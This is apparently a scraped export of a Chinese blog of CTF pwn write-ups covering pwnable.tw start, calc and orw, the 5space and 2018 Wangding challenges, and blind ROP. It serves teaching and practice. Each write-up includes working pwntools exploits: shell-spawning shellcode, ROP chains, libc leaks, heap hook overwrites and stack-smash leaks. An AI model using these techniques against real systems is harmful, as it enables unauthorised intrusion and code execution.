1234567891011121314151617181920212223242526def find_puts_plt(): addr = 0x400554 while 1: try: p = remote(&quot;127.0.0.1&quot;,10000) p.recvuntil(&quot;\\n&quot;) payload = &#x27;a&#x27; * length payload+=p64(pop_rdi) payload+=p64(0x400000) #This addr is &quot;\\x7fELF&quot; payload+=p64(addr) payload+=p64(stop_gadget) p.send(payload) output = p.recv() p.close() if output.startswith(&quot;\\x7fELF&quot;): print &quot;We got the puts_plt : %x&quot;%addr return 0 else: print &quot;%x doesn&#x27;t make sence...&quot;%addr addr += 1 continue except Exception: print &quot;%x cause some error...&quot;%addr addr += 1 continueputs_plt = 0x400560 5 . 泄露部分程序二进制数据，确定got表​ 此时我们掌握了puts_plt，可以实现任意读。 ​ 但是我们的目的是找到libc。众所周知plt表项指向的是got表，got表则指向libc的真实地址。 ​ 所以我们还需要找到puts_got。 ​ 那么为了获取更多信息，我们读一段ELF上的数据，并且通过二进制方式写入到新的文件中。 123456789101112131415161718192021222324252627def dump_file(): fi = open(&quot;code&quot;,&quot;wb&quot;) result = &quot;&quot; addr = 0x400000 while addr &lt; 0x401000: p = remote(&quot;127.0.0.1&quot;,10000) print &quot;%x connecting ...&quot;%addr try: p.recvuntil(&quot;WelCome my friend,Do you know password?\\n&quot;) payload = &#x27;a&#x27; * length + p64(pop_rdi) + p64(addr)+ p64(puts_plt)+ p64(stop_gadget) p.send(payload) data = p.recv() p.close() try: data = data[:data.index(&quot;\\nWelCome&quot;)] except Exception: data = data if data == &quot;&quot;: data = &#x27;\\x00&#x27; result += data addr += len(data) except Exception: p.close() continue print result fi.write(result)puts_got = 0x601018 ​ 通过编辑-段-设置基址，设置0x400000为基址，然后找到0x400560(第4步中得出的plt地址)。 ​ c键转换成代码。 ​ 看到此处代码跳转到了0x601018，因此这个就是puts_got。 6 . 确定libc并进行攻击​ 找到了puts_got之后，再通过LibcSearcher找到对应的libc版本(可能有多个)，然后就再leak出system的地址和bin字符串的地址，即可完成攻击。 12345678910111213141516def attack(): p = remote(&quot;127.0.0.1&quot;,10000) p.recvuntil(&quot;\\n&quot;) payload = &#x27;a&#x27; * length + p64(pop_rdi) + p64(puts_got)+ p64(puts_plt)+ p64(stop_gadget) #We can leak the real addr of puts in the libc p.send(payload) output = p.recv() output = output[:output.index(&quot;\\nWelCome&quot;)].ljust(8,&#x27;\\x00&#x27;) puts_addr = u64(output) print hex(puts_addr) libc = LibcSearcher(&#x27;puts&#x27;,puts_addr) libc_base = puts_addr - libc.dump(&#x27;puts&#x27;) sys_addr = libc_base + libc.dump(&#x27;system&#x27;) bin_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;) payload = &#x27;a&#x27; * length + p64(pop_rdi) + p64(bin_addr)+ p64(sys_addr)+ p64(stop_gadget) p.send(payload) p.interactive() ​","categories":[],"tags":[{"name":"StackOverflow","slug":"StackOverflow","permalink":"http://example.com/tags/StackOverflow/"}]},{"title":"Pwnable.tw (start & calc)","slug":"pwnable","date":"2020-07-25T00:19:47.000Z","updated":"2021-03-24T09:47:00.903Z","comments":true,"path":"2020/07/25/pwnable/","link":"","permalink":"http://example.com/2020/07/25/pwnable/","excerpt":"​ 最近边看书边刷pwnable.tw，记录一下write up。","text":"​ 最近边看书边刷pwnable.tw，记录一下write up。 0x00 . startA . Analysis​ 之前看这个题的时候一脸懵逼，事隔经年感觉貌似能做。。。 ​ 程序里只有一个浓眉大眼的start函数： ​ 其实差不多是这两行代码，一个输出一个输入。 123esp = &quot;Let&#x27;s start the CTF:&quot;;write(1,esp,0x14);read(0,esp,0x3C); ​ 而且没NX保护： ​ 那果断shellcode呗。虽然不知道栈底的位置，但可以找到start函数结束时执行了”add esp,14h”的汇编语句，可以猜测栈的大小为0x14，因为栈顶就是我们输入字符串的地方，所以padding的大小也是这么多。 ​ 不过第一次输入时，要先返回到0x08048087这个地址，此时栈帧已经收回，再一次执行write(1,esp,0x14)，就能leak出栈底地址了。 ​ 第二次输入，再将返回地址改成栈底+0x14，也就是shellcode的开头地址，即可执行shellcode。 ​ 然后开始写shellcode： 12345678xor ecx,ecx;xor edx,edx;push ecx; #字符串结尾 push 0x68732f6e; #&#x27;n/sh&#x27;push 0x69622f2f; #&#x27;//bi&#x27;mov ebx,esp;mov eax,0xb;int 0x80; ​ 然后python转机器数： 12shellcode = &quot;xor ecx,ecx;xor edx,edx;push ecx;push 0x68732f6e;push 0x69622f2f;mov ebx,esp;mov eax,0xb;int 0x80;&quot;shellcode = asm(shellcode) ​ 然后跑payload： 12345678910111213141516171819202122232425262728from pwn import *#p = process(&quot;./start&quot;)p = remote(&#x27;chall.pwnable.tw&#x27;,10000)p.recvuntil(&quot;:&quot;)payload = &#x27;A&#x27;*20 + p32(0x08048087)p.send(payload)stack_addr = u32(p.recv(4)) print &quot;Here is addr:&quot;+hex(stack_addr)&#x27;&#x27;&#x27;asm:xor ecx,ecx;xor edx,edx;push edx;push 0x68732f6e;push 0x69622f2f;mov ebx,esp;mov eax,0xb;int 0x80;&#x27;&#x27;&#x27;#shellcode=&#x27;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80&#x27;shellcode = asm(&#x27;xor ecx,ecx;xor edx,edx;push edx;push 0x68732f6e;push 0x69622f2f ;mov ebx,esp;mov eax,0xb;int 0x80&#x27;)payload = &#x27;A&#x27;*0x14 + p32(stack_addr+0x14)+shellcodep.send(payload)p.interactive() 0x01 . calcA . Analysis​ 例行公事如下： ​ 主要的函数是calc()，分别又实现了get_expr(),init_pool(),parse()三个函数。 ​ get_expr()接受用户输入计算表达式，并过滤掉除了“+-*、%0123456789”之外的字符，init_pool()申请堆块来存放数组并且初始化，程序中的若干个运算数就被存放在这个数组中，parse()进行表达式的解析并且运算。 ​ 主要来看看parse函数的执行机制： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384signed int __cdecl parse_expr(int str, _DWORD *num)&#123; int v2; // ST2C_4 int v4; // eax int v5; // [esp+20h] [ebp-88h] int i; // [esp+24h] [ebp-84h] int j; // [esp+28h] [ebp-80h] char *s1; // [esp+30h] [ebp-78h] int v9; // [esp+34h] [ebp-74h] char operator[100]; // [esp+38h] [ebp-70h] unsigned int v11; // [esp+9Ch] [ebp-Ch] v11 = __readgsdword(0x14u); v5 = str; j = 0; bzero(operator, 0x64u); for ( i = 0; ; ++i ) &#123; if ( (*(i + str) - &#x27;0&#x27;) &gt; 9 ) &#123; v2 = i + str - v5; s1 = malloc(v2 + 1); memcpy(s1, v5, v2); s1[v2] = 0; if ( !strcmp(s1, &quot;0&quot;) ) &#123; puts(&quot;prevent division by zero&quot;); fflush(stdout); return 0; &#125; v9 = atoi(s1); if ( v9 &gt; 0 ) &#123; v4 = (*num)++; num[v4 + 1] = v9; &#125; if ( *(i + str) &amp;&amp; (*(i + 1 + str) - &#x27;0&#x27;) &gt; 9 ) &#123; puts(&quot;expression error!&quot;); fflush(stdout); return 0; &#125; v5 = i + 1 + str; if ( operator[j] ) &#123; switch ( *(i + str) ) &#123; case &#x27;%&#x27;: case &#x27;*&#x27;: case &#x27;/&#x27;: if (operator[j] != &#x27;+&#x27; &amp;&amp; operator[j] != &#x27;-&#x27; ) &#123; eval(num, operator[j]); operator[j] = *(i + str); &#125; else &#123; operator[++j] = *(i + str); &#125; break; case &#x27;+&#x27;: case &#x27;-&#x27;: eval(num, operator[j]); operator[j] = *(i + str); break; default: eval(num, operator[j--]); break; &#125; &#125; else &#123; operator[j] = *(i + str); &#125; //Check Point if ( !*(i + str) ) break; &#125; &#125; while ( j &gt;= 0 ) eval(num, operator[j--]); return 1;&#125; ​ 大意是遍历每个字符，把每个运算数保存在num数组(此处num的传参是int型，因此后面数组赋值均用指针寻址)，而且从下标[1]开始保存，num[0]则用来实时保存操作数的个数。每一个运算符被存于operator数组中。 ​ 在瞅瞅实际用来进行运算的eval()函数： ​ 运算方式为:用num[0]当作下标找对应的运算数，再将其与前面的运算数(即num[num[0]-1])进行计算，结果返回到后者。 ​ 举例：输入1+3时，num[0] = 2，num[1] = 1，num[2] = 3 ​ 运算之后：num[0] = 1，num[1] = 4。 ​ 而且parse函数中的检查点会检查num[0]是否为0。 ​ 而这题的漏洞点在eval函数里。函数中规定最后一个运算数与前者进行运算，但是没有考虑过第一个运算数不存在的情况。 ​ 举例：输入+300时，num[0] = 1，num[1] = 300，执行如下代码： 1234 num[*num - 1] += num[*num];// num[num[0]-1] += num[num[0]]// num[1-1] += num[1]// num[0] += num[1] ​ 也就是说，我们输入的300，那么301会被存放在num[0]中，但是num[0]运算结束后-1，因此仍然是300。而在函数calc中我们知道，num[i-1]会被。printf输出，而calc中的i相当于parse和eval中的num[0]。最后输出的是calc函数中的num[299]，相当于输出了parse中的num[300]。所以说，”+x”句式可以达成栈上的任意读。 ​ 再举例：输入+300+1024时，num[0] = 2，num[1] = 300，num[2] = 1024，但是上面我们说过，第一步运算结束后，num[0]为302，自减后为301，因此之后会执行如下代码： 1234 num[*num - 1] += num[*num];// num[num[0]-1] += num[num[0]]// num[301-1] += num[2]// num[300] += num[2] ​ 所以我们在num[2]中写的东西，都会被加到num[300]里面。这里的num[1]和num[2]都可控，也就实现了栈上任意地址写。 B . Attack​ 虽然程序在栈上开启了canary，但是上述的任意地址写是定向的，不会破坏canary。程序还开启了栈上不可执行保护，因此我们需要通过syscall调用execve。 ​ 0x5A0÷4 = 360，所以num[0]到calc函数的栈底为360个单位。栈上结构大致如下： ​ stack of main上面都属于calc的栈帧。而我们要改写的rop链和栈结构如下： ​ 其他的改写都比较简单，重点在于“/bin/sh”字符串，要让函数成功调用，就不能让他属于calc函数和execve函数的栈帧中，以免被清空。所以写在了int 80地址的后面。 ​ 那么如何求出这个地址呢？由上图我们可以看出calc栈帧中的old ebp我们也可以读出来，因为调用calc的上层函数是main，所以这个old ebp就是main函数的ebp。于是我们知道了栈底。不过这个ebp指向的确切位置我们不知道，因此只能再找找其他偏移。在main函数的汇编代码中，我们还可以求出esp的值。 ​ 那么我们可以进而求出main函数的栈帧大小为ebp-esp+4，因为ebp和esp所在的单位都算main函数的栈帧，因此需要加4。 ​ 知道main_size之后，再用ebp - main_size，就求出了main函数的栈顶，或者说calc栈底向下的一个单位，也就是num[361]的位置。而我们知道bin语句的地址在num[368]，因此ebp - main_size + 4*8就是我们要输入”/bin/sh”的地址。 C . Exploit12345678910111213141516171819202122232425262728293031323334from pwn import *#context.log_level = &#x27;debug&#x27;#p = process(&quot;./calc&quot;)p = remote(&quot;chall.pwnable.tw&quot;,10100)int80_addr = 0x08049a21pop_eax = 0x0805c34bpop_edx = 0x0804848fpop_ecx_pop_ebx = 0x080701d1stack = [pop_eax,0xB,pop_edx,0,pop_ecx_pop_ebx,0,0,int80_addr,u32(&quot;/bin&quot;),u32(&quot;/sh\\x00&quot;)]print p.recv()p.sendline(&quot;+360&quot;)i=p.recv()ebp = int(i)+0x100000000esp = (ebp&amp;0xFFFFFFF0)-0x10main_size = ebp - esp + 4print main_sizerop_size = 4*8stack[6] = int(i)-main_size+rop_sizei = 0for i in range(0,10): index = 361 + i p.sendline(&quot;+&quot;+ str(index)) data = int(p.recvline()) if( stack[i]&gt;data): p.sendline(&quot;+&quot;+str(index)+&quot;+&quot;+str(stack[i]-data)) else: p.sendline(&quot;+&quot;+str(index)+str(stack[i]-data)) result = int(p.recvline()) print &quot;num[&quot;+str(index)+&quot;] : &quot;+str(hex(result))p.sendline(&quot;halo....&quot;)p.interactive() ​ 最后还得sendline一下才能getshell。","categories":[],"tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://example.com/tags/WriteUp/"}]},{"title":"5space (of-twice复现)","slug":"2020_5space","date":"2020-07-13T12:14:08.000Z","updated":"2021-03-27T01:09:17.506Z","comments":true,"path":"2020/07/13/2020_5space/","link":"","permalink":"http://example.com/2020/07/13/2020_5space/","excerpt":"​ 6月份的第五空间，依然啥也没做出来，不仅如此，复现还复现了好几天，算是大致上弄明白思路了。记录一下以后复习用。","text":"​ 6月份的第五空间，依然啥也没做出来，不仅如此，复现还复现了好几天，算是大致上弄明白思路了。记录一下以后复习用。 0x00 . of​ 题目直接给的就是一个.c的源码，看源码remote解题。源码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138#include&lt;stdlib.h&gt;#include&lt;stdio.h&gt;#include&lt;unistd.h&gt;#define NUM 0x10char* chunks[NUM];unsigned long cookie;#define SIZE 0x100void init_io()&#123; setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); setvbuf(stderr, 0, 2, 0); int fd = open(&quot;/dev/urandom&quot;, 0); if(fd == -1) &#123; exit(-1); &#125; read(fd, &amp;cookie, 8); close(fd);&#125;unsigned long get_int()&#123; unsigned long res; scanf(&quot;%ld&quot;, &amp;res); return res;&#125;void allocate()&#123; unsigned long idx; printf(&quot;Index: &quot;); idx = get_int(); if(idx &gt;= NUM)&#123; return ; &#125; char* buf = malloc(SIZE); if(buf == NULL)&#123; puts(&quot;allocate failed&quot;); return; &#125; chunks[idx] = buf; unsigned long* p = chunks[idx] + SIZE - 8; *p = cookie; puts(&quot;Done!&quot;);&#125;void delete()&#123; unsigned long idx; printf(&quot;Index: &quot;); idx = get_int(); if(idx &gt;= NUM || chunks[idx] == NULL)&#123; return ; &#125; unsigned long* p = chunks[idx] + SIZE - 8; if(*p != cookie) return; *p = 0; free(chunks[idx]);&#125;void show()&#123; unsigned long idx; printf(&quot;Index: &quot;); idx = get_int(); if(idx &gt;= NUM || chunks[idx] == NULL)&#123; return ; &#125; unsigned long* p = chunks[idx] + SIZE - 8; if(*p != cookie) return; write(1, &quot;Content: &quot;, strlen(&quot;Content: &quot;)); write(1, chunks[idx], SIZE - 8); write(1, &quot;\\n&quot;, 1);&#125;void edit()&#123; unsigned long idx; printf(&quot;Index: &quot;); idx = get_int(); if(idx &gt;= NUM || chunks[idx] == NULL)&#123; return ; &#125; unsigned long* p = chunks[idx] + SIZE - 8; if(*p != cookie) return; printf(&quot;Content: &quot;); read(0, chunks[idx], SIZE);&#125;void menu()&#123; puts(&quot;1. allocate&quot;); puts(&quot;2. edit&quot;); puts(&quot;3. show&quot;); puts(&quot;4. delete&quot;); puts(&quot;5. exit&quot;); printf(&quot;Your choice: &quot;);&#125;int main()&#123; init_io(); puts(&quot;Made on Ubuntu 18.04&quot;); while(1) &#123; menu(); unsigned long choice = get_int(); switch(choice) &#123; case 1: allocate(); break; case 2: edit(); break; case 3: show(); break; case 4: delete(); break; case 5: exit(0); break; default: puts(&quot;Unknown&quot;); break; &#125; &#125; return 0;&#125; ​ 看上去是个heap题，而且没有double free，但是有UAF。不过这个题目在每一个chunk中塞进了一个cookies，cookies随机生成，所以说如果要泄露起来就会很麻烦。不过看了不少write up，都说这题在部署上有点问题，remote过去不存在cookies的。所以可以正常思路直接写。 ​ 用UAF可以泄露出libc基质，改写free_hook或者malloc_hook，使其指向system，再free掉写着”/bin/sh”的堆，就相当于执行了system(“/bin/sh”)。 ​ 不过这题碰到了一个新的机制tcache。tcache是在libc2.23之后引入的，跟glibc中的各种bin类似，是一个对chunk进行申请释放操作时会用到的一个内存池。tcache是64个单向链表，每个链表最多7个节点(chunk)，chunk的大小在32bit上是12到512（8byte递增）；在64bits上是24到1024（16bytes递增）。 ​ 在这题中，申请chunk的大小统一为0x100，属于unsort bin，所以我们如果释放8个chunk，才会使第8个chunk处于unsort bin中。而此时unsort bin中仅有一个chunk，其fd和bk都指向main_arena的一定偏移处。即可leak出libc。 ​ payload参考 123456789101112131415161718192021222324252627282930313233343536from pwn import *context.log_level=&quot;debug&quot;def add(index): p.sendlineafter(&quot;: &quot;,&quot;1&quot;) p.sendlineafter(&quot;: &quot;,str(index))def edit(index,note): p.sendlineafter(&quot;: &quot;,&quot;2&quot;) p.sendlineafter(&quot;Index: &quot;,str(index)) p.sendafter(&quot;Content: &quot;,note)def show(index): p.sendlineafter(&quot;: &quot;,&quot;3&quot;) p.sendlineafter(&quot;Index: &quot;,str(index))def delete(index): p.sendlineafter(&quot;: &quot;,&quot;4&quot;) p.sendlineafter(&quot;: &quot;,str(index))#p=remote(&quot;121.36.74.70&quot;,9999)p=process(&quot;./of&quot;)for i in range(9): add(i)for i in range(8): delete(i)show(7)p.recvuntil(&quot;: &quot;)libc=u64(p.recv(6)+&quot;\\x00\\x00&quot;)-0x7ffff7dcfca0+0x7ffff79e4000print hex(libc)edit(6,p64(libc+0x003ed8e8))edit(0,&quot;/bin/sh\\x00&quot;)add(10)add(11)edit(11,p64(libc+0x04f440))delete(0)p.interactive() 0x01 . twice​ 本质上是个rop题。。。但是确实非常费脑子，看得头秃，有的调试还没整明白，之后再详细研究漏洞原理。 ​ 主函数如下，主要功能是遍历调用judge1，实际上只能成功调用两次。 ​ judge1是程序的主要函数，实现了读入的功能，读入的字节数由judge2决定。而且如果ncount不为0或1，则返回值为0，这也就限定了主函数中的for循环仅进行两次。 ​ judge2中限定了，ncount为0时返回值为89，ncount为1时返回值为112，其他情况下不允许读入。 ​ 程序的主要功能是允许进行两次读入，第一次读入89字节，第二次112字节，但是buf的长度是88，因此会溢出一个字节。 ​ 利用这个溢出，再加上read读入数据不加以补“\\x00”的特性，在read的下一步进行puts时，程序会输出到下一个”\\x00”为止，因此我们可以泄露出旧的rbp地址以及canary的值。 ​ 不过程序开启了NX保护，栈上代码不可执行，不能直接写shellcode。这里需要用到新知识，栈转移技术（frame faking），制作一个假的栈帧进行rop。因为程序中没有system函数，因此我们需要用rop泄露出libc基址，再进行rop调用system(“/bin/sh”) ​ frame faking的大致payload格式为： ​ |xxxx xxxx|rop chain|padding|fake ebp|leave addr| ​ 将返回地址覆盖为leave汇编代码的地址，这样read函数结束后先进行本身函数的leave操作，再跳转到指定地址（即leave地址）又进行一次leave操作，使得rsp和rbp指向rop chain的适当位置，得以执行我们设计的fake stack frame。 ​ 将rop chain细化可以得到如下payload： ​ |xxxx xxxx|arg1|arg2|…|fuction addr|ret addr|padding|fake ebp|leave addr| ​ 为了多次进行leak，需要把上述ret addr即假栈帧的返回地址，再设置为漏洞所在函数，即可重复调用。 ​ 此处需要注意的是，rop chain中可能需要进行弹栈操作，需要利用ROPgardge查找相应的地址。 ​ payload参考 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *context.log_level = &#x27;debug&#x27; p = process(&#x27;./twice&#x27;)puts_plt_addr = 0x4005C0read_got_addr = 0x601038pop_rdi = 0x400923leave = 0x400879main_addr = 0x40087Bp.recvuntil(&#x27;&gt;&#x27;)payload = &#x27;a&#x27;*88+&#x27;\\n&#x27;p.send(payload)p.recv(89)canary = u64(&#x27;\\x00&#x27;+p.recv(7))success(hex(canary))rbp = u64(p.recvuntil(&#x27;\\n&#x27;)[:-1].ljust(8,&#x27;\\x00&#x27;))-112success(hex(rbp))p.recvuntil(&#x27;&gt;&#x27;)payload = p64(0)+p64(pop_rdi)+p64(read_got_addr)+p64(puts_plt_addr)+p64(main_addr)payload += &#x27;a&#x27;*8*6+p64(canary)+p64(rbp)+p64(leave)p.send(payload)p.recvuntil(&#x27;\\n&#x27;)libc_addr = u64(p.recv(6).ljust(8,&#x27;\\x00&#x27;))-0xEE590sp.recvuntil(&#x27;&gt;&#x27;)payload = &#x27;a&#x27;*88+&#x27;\\n&#x27;p.send(payload)p.recv(89)canary = u64(&#x27;\\x00&#x27;+p.recv(7))success(hex(canary))rbp2 = u64(p.recvuntil(&#x27;\\n&#x27;)[:-1].ljust(8,&#x27;\\x00&#x27;))-112success(hex(rbp2))p.recvuntil(&#x27;&gt;&#x27;)payload = p64(0)+p64(pop_rdi)+p64(libc_addr+0x1881AC)+p64(libc_addr+0x48880)+p64(main_addr)payload += &#x27;a&#x27;*8*6+p64(canary)+p64(rbp2)+p64(leave)p.send(payload)p.interactive()","categories":[],"tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://example.com/tags/WriteUp/"}]},{"title":"Seccomp Sandbox (ORW)","slug":"sandbox","date":"2020-07-07T13:14:08.000Z","updated":"2021-03-24T09:47:06.974Z","comments":true,"path":"2020/07/07/sandbox/","link":"","permalink":"http://example.com/2020/07/07/sandbox/","excerpt":"​ freebuf公开课pwn第五课总结。","text":"​ freebuf公开课pwn第五课总结。 0x00 . 沙箱​ 沙箱是一个虚拟系统程序，沙箱提供的环境相对于每一个运行的程序都是独立的，而且不会对现有的系统产生影响，即沙箱提供一个限制该应用程序对系统资源的访问权限。如果程序调用了沙箱函数，也就是说后面执行的代码都会在这个沙箱中进行。而沙箱会限制许多库函数导致其无法使用。所以如果要getshell，要么仅利用当前沙箱允许的程序进行getshell，要么进行沙箱逃逸(一般指的是python沙箱逃逸)。具体方式需要结合实际的环境和情况。 0x01 . ORW​ orw指的是三个最基本的库函数，open，read，write。很多时候题目会要求我们仅用这三个函数实现getshell。大致程序流程为： 123fd = open(&quot;/home/test/flag&quot;); //用open函数打开flag文件并获取索引read(fd,buf,0x100); //将文件中的文本通过read函数输入到buf中write(1,buf,0x100); //用write函数输出buf 0x02 . orw From pwnable.tw​ 在pwnable.tw上找了一个沙箱例题。 1.Analysis​ 例行公事1： ​ 例行公事2： ​ 例行公事3： ​ 运行之后是segment fault。 ​ 在ida32上可以看到main函数十分简短，而且发现了大大的orw_seccomp()，可以确定程序存在沙箱没跑了。 ​ 而沙箱函数后面的程序，大意就是输入shellcode并用函数指针执行。但是因为存在沙箱，所以当然不能直接执行system(“/bin/sh”)。先用seccomp-tools来看看程序沙箱的限制。 ​ 程序中orw的三个函数都是可以调用的。因此需要通过这三个函数写shellcode。 2.Shellcode​ 我们已经知道了只运用orw三个函数如何获取flag，现在只需要把整个流程写成汇编的shellcode即可。 ​ 除此之外还需要查一下系统调用函数需要用到那些寄存器，及其分别有哪些作用： a . fd = open(“/home/orw/flag”)123456789xor eax,eax;xor ebx,ebx; //初始化xor ecx,ecx;xor edx,edx;mov eax,0x5; //open的系统调用码为0x5push 0x00006761; //flag路径，需要补0push 0x6c662f77; //逆序push 0x726f2f65; //压栈暂存push 0x6d6f682f; mov ebx,esp; //路径保存至ebxint 0x80; b . read(fd,buf,0x30);12345mov ebx,eax; //上一函数后，eax已获得fdmov ecx,esp; //将路径的flag文件read到栈上mov edx,0x30; //读取字节数为0x30mov eax,0x03; //read的系统调用码为0x3int 0x80; c.write(1,buf,0x30)12345mov eax,0x4; //write的系统调用码为0x4mov ebx,0x1; //fd = stdoutmov ecx,ecx; //要输出的flag在栈上，但是ecx已经指向esp了，因此本步可以不写mov edx,0x30; //输出字节数为0x30int 0x80; 3.Exploit1234567891011from pwn import *#p = process(&quot;./orw&quot;)p = remote(&quot;chall.pwnable.tw&quot;,10001)_open = &quot;xor eax,eax;xor ebx,ebx;xor ecx,ecx;xor edx,edx;push 0x00006761;push 0x6c662f77;push 0x726f2f65;push 0x6d6f682f;mov ebx,esp;mov eax,0x5;int 0x80;&quot;_read = &quot;mov ebx,eax;mov ecx,esp;mov edx,0x30;mov eax,0x3;int 0x80;&quot;_write = &quot;mov ebx,0x1;mov ecx,esp;mov edx,0x30;mov eax,0x4;int 0x80;&quot;payload = _open+_read+_writepayload = asm(payload)p.send(payload)print p.recv(0x20)p.interactive()","categories":[],"tags":[{"name":"Summary","slug":"Summary","permalink":"http://example.com/tags/Summary/"}]},{"title":"2018网鼎pwn (guess复现)","slug":"guess","date":"2020-04-13T12:14:08.000Z","updated":"2021-03-24T09:46:26.176Z","comments":true,"path":"2020/04/13/guess/","link":"","permalink":"http://example.com/2020/04/13/guess/","excerpt":"​ 2018网鼎pwn题复现与学习。","text":"​ 2018网鼎pwn题复现与学习。 ​ 因为网鼎、铁三、国赛差不多了，而且刘老板也给了建议，就决定来复现一下2018网鼎的pwn题。毕竟赛题比一般的旧题目含金量更多，能学到很多东西。 ​ 写题解之前先贴一些铺垫知识，都是这个题目会用到的，也是新学到的。 0x00 . Stack Smash​ 这个技术算是栈溢出技术的一种，也收录在CTF-Wiki中。 ​ 对于开启了canary保护的程序，我们不能直接进行栈溢出，因为会破坏canary的值。 ​ 如果函数返回时检查到canary被破坏了，就会跳转到__stack_chk_fail()函数开始执行。 ​ 看一下库文件中的__stack_chk_fail()及其引用函数： ​ 再看一下源码(版本为glibc-2.23)： ​ 我们可以看到，__stack_chk_fail()会调用__fortify_fail()，而后者输出了一行字符串，实际上是用来提示用户该程序出错，而__libc_argv[0]中存的就是程序名。 ​ 而该变量作为命令行参数，存在main函数的栈帧上，也就是说，如果我们在栈上可以进行足够长的输入，就能覆盖canary，再将想要泄露的target_addr覆盖argv[0]，此时系统监测到溢出，执行__stack_chk_fail()和__fortify_fail()就能输出target_get的内容。 ​ 用这样的栈溢出理论上实现了任意读（满足读权限），但是泄露了之后系统就关闭进程，无法继续攻击。 0x01 . Linux 父子进程​ 在linux程序中，一般用fork函数来创建一个新的子进程。 ​ 这个新的子进程理论上算是原进程的一个副本，执行fork()时，系统先为子进程分配资源，再将原进程的一系列数据和变量复制到子进程中。这个复制的结果是，数据和变量的值都一样，在系统中的虚拟地址是一样的，但是物理地址不同，也就是说将数据复制到了另一个物理地址，即副本。 ​ 而新进程原进程在fork()执行之后，返回值为子进程的id。那么对于v1变量，原进程的值为子进程的id，子进程没有子进程，v1自然为0。如果返回值为-1，即创建进程失败。 ​ 当fork()执行结束，父子进程的下一行代码都是if(v1 == -1)，都从这里开始执行。 0x02 . GUESSA . Analysis​ 用ida打开文件可以看见，程序一开始就将flag.txt读取到了栈上: ​ 不过程序中存在canary保护。 ​ 跑一下，其实就是让你输入flag。输入AAAAAAAA。 ​ gdb调试看看栈上的情况，可以看到flag的确在栈上（此处用了本地的flag）。 ​ 可以得知以下部分变量的地址。 Variable Addr argv[0] 0x7fffffffdd88 flag.txt 0x7fffffffdc30 User Input 0x7fffffffdc60 ​ 其中argv[0]为命令行参数，存的是程序路径及程序名“GUESS”。之所以要提到argv[0]是因为此处可以用到本文上述的花式栈溢出技巧stack smash。因为程序中的用户输入是用gets()实现的，因此用我们可以用input将足够长的padding和puts的got表值覆盖到argv[0]，从而泄露libc基址。(0xdd88 - 0xdc60 == 0x128) ​ 得到了libc的地址，我们还需要泄露另一个变量environ。这个变量存的是程序的栈基址，我们可以根据flag.txt在栈上的固定偏移，来确定flag的实际地址。environ变量被存在符号表中，所以也可以通过上述的stack smash泄露got表的方式得到。 ​ gdb下断点得到当前的栈地址。 12environ - flag_aar == 0x168environ - 0x168 == flag_aar ​ 现在只要再一次进行stack smash泄露出栈上的flag即可。 B . Exploit123456789101112131415161718192021222324252627from pwn import *context.log_level = &#x27;debug&#x27;p = process(&#x27;./guess&#x27;)elf = ELF(&#x27;./guess&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)payload = 0x128 * &#x27;B&#x27; + p64(elf.got[&#x27;puts&#x27;])p.sendlineafter(&quot;Please type your guessing flag&quot;,payload)#gdb.attach(p)p.recvuntil(&quot;*** stack smashing detected ***: &quot;)puts_gots = u64(p.recv(6).ljust(8,&#x27;\\0&#x27;))print &quot;puts_gots : &quot; + hex(puts_gots)libc_addr = puts_gots - libc.symbols[&#x27;puts&#x27;]print &quot;libc_addr : &quot; + hex(libc_addr)stack_addr = libc_addr + libc.symbols[&#x27;environ&#x27;]payload = 0x128 * &#x27;B&#x27; + p64(stack_addr)p.sendlineafter(&quot;Please type your guessing flag&quot;,payload)p.recvuntil(&quot;*** stack smashing detected ***: &quot;)stack_addr = u64(p.recv(6).ljust(8,&#x27;\\0&#x27;))print &quot;stack_addr : &quot; + hex(stack_addr)payload = 0x128 * &#x27;C&#x27; + p64(stack_addr - 0x168)p.sendlineafter(&quot;Please type your guessing flag&quot;,payload)p.recvuntil(&quot;*** stack smashing detected ***: &quot;)p.interactive()","categories":[],"tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://example.com/tags/WriteUp/"}]},{"title":"Vtable-Hijack(the_end)","slug":"Vtable-Hijack(the_end)","date":"2020-04-09T13:09:47.000Z","updated":"2021-03-24T09:49:11.506Z","comments":true,"path":"2020/04/09/Vtable-Hijack(the_end)/","link":"","permalink":"http://example.com/2020/04/09/Vtable-Hijack(the_end)/","excerpt":"​ 关于IO FILE 中的vtable劫持。","text":"​ 关于IO FILE 中的vtable劫持。 ​ 因为在wctf2020碰到了一个贼简单(没做出来🙃)的io重定向题目，而且刘老板刷how2heap的时候也碰到了一些io相关的题目，所以我感觉该稍微了解了解pwn中的io。 0x00 . IO入门 —— 基本结构体​ _IO_FILE是最基本的io流相关结构，长这样： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647struct _IO_FILE &#123; int _flags; /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno;#if 0 int _blksize;#else int _flags2;#endif _IO_off_t _old_offset; /* This used to be _offset but 